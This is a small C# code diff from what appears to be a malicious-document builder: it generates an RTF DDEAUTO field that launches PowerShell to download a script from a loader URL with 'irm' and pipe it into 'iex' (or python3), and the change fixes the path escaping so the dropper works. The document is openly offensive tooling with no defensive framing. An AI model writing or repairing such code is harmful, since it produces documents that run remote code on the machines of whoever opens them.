@@ -194,7 +194,7 @@
             ? "python3"
             : "iex";
         var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | {pipe}";
-        return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
+        return @"{\field{\*\fldinst {DDEAUTO c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
     }
 
     private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden, LoaderType loaderType)
